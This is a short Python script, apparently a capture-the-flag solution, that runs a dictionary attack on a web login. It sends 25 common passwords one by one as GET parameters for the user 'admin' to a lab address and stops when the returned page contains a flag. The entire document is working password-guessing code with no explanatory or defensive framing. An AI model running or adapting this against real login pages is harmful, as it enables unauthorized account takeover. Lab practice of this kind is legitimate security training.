import requests
from bs4 import BeautifulSoup
import sys

def urlScrapper(url):
    request = requests.get(url)
    page = request.content
    soup = BeautifulSoup(page, features="html.parser")
    if "flag" in str(soup):
        print(str(soup))
        return True
    return False

possible_pwd = ["123456", 
                "password", 
                "12345678", 
                "qwerty", 
                "abc123", 
                "123456789", 
                "111111", 
                "1234567", 
                "iloveyou", 
                "adobe123", 
                "123123", 
                "Admin", 
                "1234567890", 
                "letmein", 
                "photoshop", 
                "1234", 
                "monkey", 
                "shadow", 
                "sunshine", 
                "12345", 
                "password1", 
                "princess", 
                "azerty", 
                "trustno1", 
                "000000"]
    
url  = "http://10.11.200.231/?page=signin&username=admin&password={}&Login=Login#"

for pwd in possible_pwd:
    if urlScrapper(url.format(pwd)):
        print("the password is :", pwd)
        break
    print("not password :", pwd)